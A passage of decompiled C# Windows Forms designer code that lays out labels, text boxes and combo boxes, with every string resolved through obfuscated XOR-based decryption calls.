		((Control)textBox18).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x589A4782 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a578ede9d9414aabbdcf1d01b7348baf);
		((Control)textBox18).Size = new Size(195, 23);
		((Control)textBox18).TabIndex = 75;
		((Control)textBox18).TextChanged += textBox18_TextChanged;
		((Control)label30).AutoSize = true;
		((Control)label30).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1BA11E9E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_13ebf17f56b549d9971d1dc2218be2ad), 10f, (FontStyle)1);
		((Control)label30).ForeColor = SystemColors.ControlLightLight;
		((Control)label30).Location = new Point(638, 592);
		((Control)label30).Margin = new Padding(5, 0, 5, 0);
		((Control)label30).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2319F4AC ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8af4c72c2bf24df2961c47634b9fc94e);
		((Control)label30).Size = new Size(85, 16);
		((Control)label30).TabIndex = 74;
		((Control)label30).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22DA8D47 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dcdaa6b2b9864be395d7b1ef5fda91ed);
		((Control)label31).AutoSize = true;
		((Control)label31).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x596CF912 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_e38ac3b620fc42ae863103cddbe6a1eb), 8f, (FontStyle)1);
		((Control)label31).ForeColor = SystemColors.ControlLightLight;
		((Control)label31).Location = new Point(852, 594);
		((Control)label31).Margin = new Padding(5, 0, 5, 0);
		((Control)label31).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x387F6E15 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_903c9fa40f3d4d0fb3bcd63cbccd82bc);
		((Control)label31).Size = new Size(110, 14);
		((Control)label31).TabIndex = 73;
		((Control)label31).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x24C47A8 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f21b1171952f4cd2aae5d7be2be94970);
		((Control)label32).AutoSize = true;
		((Control)label32).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54C10D48 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_79a180699bf54d4d83e647d26385348a), 10f, (FontStyle)1);
		((Control)label32).ForeColor = SystemColors.ControlLightLight;
		((Control)label32).Location = new Point(1043, 592);
		((Control)label32).Margin = new Padding(5, 0, 5, 0);
		((Control)label32).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x128D130 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_807d1b955a4f4b29a5cb4b57c2d18bc3);
		((Control)label32).Size = new Size(87, 16);
		((Control)label32).TabIndex = 72;
		((Control)label32).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20C29702 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8141a8b72aa44b3a664e8c4a2731290);
		((Control)label28).AutoSize = true;
		((Control)label28).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(--328687871 ^ 0x35C2E879 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2f12304c094c4981ae78cdfa1dc9cd9e), 10f, (FontStyle)1);
		((Control)label28).ForeColor = SystemColors.ControlLightLight;
		((Control)label28).Location = new Point(1043, 536);
		((Control)label28).Margin = new Padding(5, 0, 5, 0);
		((Control)label28).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2875DD29 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c07131ca78724f7dbfd5c111b94d27a3);
		((Control)label28).Size = new Size(89, 16);
		((Control)label28).TabIndex = 71;
		((Control)label28).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1F03D535 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_ba511a03f3884e04a1032f95e5af7ce7);
		((Control)label27).AutoSize = true;
		((Control)label27).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x608EB93C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9), 10f, (FontStyle)1);
		((Control)label27).ForeColor = SystemColors.ControlLightLight;
		((Control)label27).Location = new Point(852, 536);
		((Control)label27).Margin = new Padding(5, 0, 5, 0);
		((Control)label27).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x128D188 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_807d1b955a4f4b29a5cb4b57c2d18bc3);
		((Control)label27).Size = new Size(80, 16);
		((Control)label27).TabIndex = 70;
		((Control)label27).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x74DB3E11 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_904c7ffdb8fc47b685c80da894c6344f);
		((Control)textBox13).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(-1148833791 ^ -1001440685 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f6b54f43bc5c4099a4aa9b9155cdd47a), 10f, (FontStyle)1);
		((Control)textBox13).Location = new Point(640, 555);
		((Control)textBox13).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5C9AE1BF ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0d8c03b1d7c340b4853785e650ce2549);
		((Control)textBox13).Size = new Size(206, 23);
		((Control)textBox13).TabIndex = 69;
		((Control)textBox13).TextChanged += textBox13_TextChanged;
		((Control)textBox14).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3BD0CE5F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e52265234ff4c2a9724c7236ffbb26e), 10f, (FontStyle)1);
		((Control)textBox14).Location = new Point(856, 555);
		((Control)textBox14).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2B718FD6 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d4486f79952142cc9aa30d377c51de33);
		((Control)textBox14).Size = new Size(185, 23);
		((Control)textBox14).TabIndex = 68;
		((Control)textBox14).TextChanged += textBox14_TextChanged;
		((Control)textBox15).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22F1A40E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_69dd1a730f2a42979206d319258f7586), 10f, (FontStyle)1);
		((Control)textBox15).Location = new Point(1047, 555);
		((Control)textBox15).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x128D1DE ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_807d1b955a4f4b29a5cb4b57c2d18bc3);
		((Control)textBox15).Size = new Size(195, 23);
		((Control)textBox15).TabIndex = 67;
		((Control)textBox15).TextChanged += textBox15_TextChanged;
		((Control)label29).AutoSize = true;
		((Control)label29).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x63EEF6A6 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70403a9e26494e1a929252072003a0e6), 10f, (FontStyle)1);
		((Control)label29).ForeColor = SystemColors.ControlLightLight;
		((Control)label29).Location = new Point(638, 536);
		((Control)label29).Margin = new Padding(5, 0, 5, 0);
		((Control)label29).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x60583B23 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dbb1db1002814c06a313ab667583ca7c);
		((Control)label29).Size = new Size(65, 16);
		((Control)label29).TabIndex = 64;
		((Control)label29).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2B718E18 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d4486f79952142cc9aa30d377c51de33);
		((Control)textBox10).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20A10943 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_53033b46cc2d41edad0c17b7fd0897bc), 10f, (FontStyle)1);
		((Control)textBox10).Location = new Point(642, 493);
		((Control)textBox10).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20C2965A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8141a8b72aa44b3a664e8c4a2731290);
		((Control)textBox10).Size = new Size(100, 23);
		((Control)textBox10).TabIndex = 63;
		((Control)textBox10).TextChanged += textBox10_TextChanged;
		((Control)textBox11).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46A2B1CF ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0cbf980cef9f4f6d841f2b5e631058fc), 10f, (FontStyle)1);
		((Control)textBox11).Location = new Point(748, 493);
		((Control)textBox11).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3BD0C8B1 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e52265234ff4c2a9724c7236ffbb26e);
		((Control)textBox11).Size = new Size(102, 23);
		((Control)textBox11).TabIndex = 62;
		((Control)textBox11).TextChanged += textBox11_TextChanged;
		((Control)textBox12).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x24C407E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f21b1171952f4cd2aae5d7be2be94970), 10f, (FontStyle)1);
		((Control)textBox12).Location = new Point(856, 493);
		((Control)textBox12).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(-836630164 ^ -786309773 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_ba511a03f3884e04a1032f95e5af7ce7);
		((Control)textBox12).Size = new Size(100, 23);
		((Control)textBox12).TabIndex = 61;
		((Control)textBox12).TextChanged += textBox12_TextChanged;
		((Control)label24).AutoSize = true;
		((Control)label24).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x12234618 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fea9b05f02bd4e4abbe97e02da99e90b), 10f, (FontStyle)1);
		((Control)label24).ForeColor = SystemColors.ControlLightLight;
		((Control)label24).Location = new Point(746, 473);
		((Control)label24).Margin = new Padding(5, 0, 5, 0);
		((Control)label24).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x60583A8B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dbb1db1002814c06a313ab667583ca7c);
		((Control)label24).Size = new Size(20, 16);
		((Control)label24).TabIndex = 60;
		((Control)label24).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22F1A2BE ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_69dd1a730f2a42979206d319258f7586);
		((Control)label25).AutoSize = true;
		((Control)label25).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x11AC6C7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0297d3947c2a44f3845616d12eba22f2), 10f, (FontStyle)1);
		((Control)label25).ForeColor = SystemColors.ControlLightLight;
		((Control)label25).Location = new Point(857, 473);
		((Control)label25).Margin = new Padding(5, 0, 5, 0);
		((Control)label25).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DAA06BF ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8ecef0c4e6e47e98be39ecaecaed208);
		((Control)label25).Size = new Size(91, 16);
		((Control)label25).TabIndex = 59;
		((Control)label25).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54C10B1E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_79a180699bf54d4d83e647d26385348a);
		((Control)label26).AutoSize = true;
		((Control)label26).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22F1A40E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_69dd1a730f2a42979206d319258f7586), 10f, (FontStyle)1);
		((Control)label26).ForeColor = SystemColors.ControlLightLight;
		((Control)label26).Location = new Point(638, 473);
		((Control)label26).Margin = new Padding(5, 0, 5, 0);
		((Control)label26).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x41E0F731 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_88e9930f59e44575938220c3d0d1476a);
		((Control)label26).Size = new Size(77, 16);
		((Control)label26).TabIndex = 58;
		((Control)label26).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22F1A266 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_69dd1a730f2a42979206d319258f7586);
		comboBox6.DropDownStyle = (ComboBoxStyle)2;
		((Control)comboBox6).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54E9048F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_be6aa5f9bc844d2098a21bb598f8ce61), 10f, (FontStyle)1);
		((ListControl)comboBox6).FormattingEnabled = true;
		comboBox6.Items.AddRange(new object[7]
		{
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x41E0F745 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_88e9930f59e44575938220c3d0d1476a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x6F726E6C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2b8c33c9b9eb4979870d40c63f7b4165),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1BA1077E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_13ebf17f56b549d9971d1dc2218be2ad),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(-1646586438 ^ -1879553488 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fea9b05f02bd4e4abbe97e02da99e90b),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1160BD1A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_07094e8430e84644a3b46793c68193e0),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DC117C6 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a0a12e2948a64c7f9bea608a6f866e06),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5BBB5957 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_57a6661532394af0a3862bba53f2036e)
		});
		((Control)comboBox6).Location = new Point(380, 666);
		((Control)comboBox6).Margin = new Padding(5, 3, 5, 3);
		((Control)comboBox6).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x41E0E83F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_88e9930f59e44575938220c3d0d1476a);
		((Control)comboBox6).Size = new Size(213, 24);
		((Control)comboBox6).TabIndex = 57;
		comboBox6.SelectedIndexChanged += comboBox6_SelectedIndexChanged;
		((Control)label23).AutoSize = true;
		((Control)label23).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x12234618 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fea9b05f02bd4e4abbe97e02da99e90b), 10f, (FontStyle)1);
		((Control)label23).ForeColor = SystemColors.ControlLightLight;
		((Control)label23).Location = new Point(379, 647);
		((Control)label23).Margin = new Padding(5, 0, 5, 0);
		((Control)label23).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7FC9134C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f6b54f43bc5c4099a4aa9b9155cdd47a);
		((Control)label23).Size = new Size(81, 16);
		((Control)label23).TabIndex = 56;
		((Control)label23).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20C28992 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8141a8b72aa44b3a664e8c4a2731290);
		comboBox5.DropDownStyle = (ComboBoxStyle)2;
		((Control)comboBox5).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x50BCBB04 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_baadfbd8c0914381a19d37bd12cce8f6), 10f, (FontStyle)1);
		((ListControl)comboBox5).FormattingEnabled = true;
		comboBox5.Items.AddRange(new object[10]
		{
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x11ADF27 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0297d3947c2a44f3845616d12eba22f2),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x694610C1 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_45f3ae80ba3140afaf29a3f1d417534f),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5BBB593F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_57a6661532394af0a3862bba53f2036e),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(--932377358 ^ 0x4A53E540 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a0a12e2948a64c7f9bea608a6f866e06),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x10ACA119 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6ae29e5e756542b6a6630ad169e9dc76),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD6C81C2 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5b0fe3a425954f52ae9caf2769498823),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x608EA1D4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x11ADE5D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0297d3947c2a44f3845616d12eba22f2),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(--183415037 ^ 0x48103071 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_ce14555c8e314f729d5e754b0132dafe),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x75BC7808 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cdcebee94fe242b1b3cd47154bb8d2f8)
		});
		((Control)comboBox5).Location = new Point(197, 666);
		((Control)comboBox5).Margin = new Padding(5, 3, 5, 3);
		((Control)comboBox5).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5C9AFE6D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0d8c03b1d7c340b4853785e650ce2549);
		((Control)comboBox5).Size = new Size(173, 24);
		((Control)comboBox5).TabIndex = 55;
		comboBox5.SelectedIndexChanged += comboBox5_SelectedIndexChanged;
		((Control)label22).AutoSize = true;
		((Control)label22).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x30028B47 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fe963489b71c4328899bd0cc4b7f7da9), 10f, (FontStyle)1);
		((Control)label22).ForeColor = SystemColors.ControlLightLight;
		((Control)label22).Location = new Point(202, 647);
		((Control)label22).Margin = new Padding(5, 0, 5, 0);
		((Control)label22).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x6946115F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_45f3ae80ba3140afaf29a3f1d417534f);
		((Control)label22).Size = new Size(74, 16);
		((Control)label22).TabIndex = 54;
		((Control)label22).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x11ADE91 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0297d3947c2a44f3845616d12eba22f2);
		comboBox4.DropDownStyle = (ComboBoxStyle)2;
		((Control)comboBox4).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(--1146229973 ^ 0x2F0A51A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0cbf980cef9f4f6d841f2b5e631058fc), 10f, (FontStyle)1);
		((ListControl)comboBox4).FormattingEnabled = true;
		comboBox4.Items.AddRange(new object[8]
		{
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46A2A98F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0cbf980cef9f4f6d841f2b5e631058fc),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DC11772 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a0a12e2948a64c7f9bea608a6f866e06),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x75BC7928 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cdcebee94fe242b1b3cd47154bb8d2f8),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2319E994 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8af4c72c2bf24df2961c47634b9fc94e),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD045F9E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_429d35516f59415f9df9c1fe0976e925),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1F03CAE1 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_ba511a03f3884e04a1032f95e5af7ce7),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5C9AFECB ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0d8c03b1d7c340b4853785e650ce2549),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3BD0D70B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e52265234ff4c2a9724c7236ffbb26e)
		});
		((Control)comboBox4).Location = new Point(10, 666);
		((Control)comboBox4).Margin = new Padding(5, 3, 5, 3);
		((Control)comboBox4).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x74DB215B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_904c7ffdb8fc47b685c80da894c6344f);
		((Control)comboBox4).Size = new Size(177, 24);
		((Control)comboBox4).TabIndex = 53;
		comboBox4.SelectedIndexChanged += comboBox4_SelectedIndexChanged;
		((Control)label21).AutoSize = true;
		((Control)label21).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54E9048F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_be6aa5f9bc844d2098a21bb598f8ce61), 10f, (FontStyle)1);
		((Control)label21).ForeColor = SystemColors.ControlLightLight;
		((Control)label21).Location = new Point(10, 647);
		((Control)label21).Margin = new Padding(5, 0, 5, 0);
		((Control)label21).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(-1646586438 ^ -44714818 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9);
		((Control)label21).Size = new Size(75, 16);
		((Control)label21).TabIndex = 52;
